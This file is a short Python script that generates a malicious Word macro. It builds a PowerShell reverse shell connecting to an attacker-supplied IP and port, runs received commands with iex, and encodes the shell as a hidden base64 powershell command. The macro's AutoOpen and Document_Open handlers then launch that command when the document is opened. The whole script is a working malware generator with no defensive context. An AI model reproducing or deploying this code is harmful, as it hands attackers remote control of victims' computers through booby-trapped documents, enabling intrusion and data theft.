import sys
import base64

def help():
  print("Usage: ./payload <IP> <PORT>")
  exit()

try:
  (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
  help()

payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
payload = payload % (ip, port)

encoded_payload = base64.b64encode(payload.encode('utf16')[2:]).decode()
cmdline = "powershell.exe -nop -w hidden -e " + encoded_payload

macro_payload = """
Sub AutoOpen()
	AutoOpenMacro
End Sub

Sub Document_Open()
	AutoOpenMacro
End Sub

Sub AutoOpenMacro()
	Dim Str as String

"""

for i in range(0, len(cmdline), 50):
  macro_payload = macro_payload + "        Str = Str +" + '"' + cmdline[i:i + 50] + '"\n'

macro_payload = macro_payload + """
	CreateObject("Wscript.Shell").Run Str
End Sub
"""

print(macro_payload)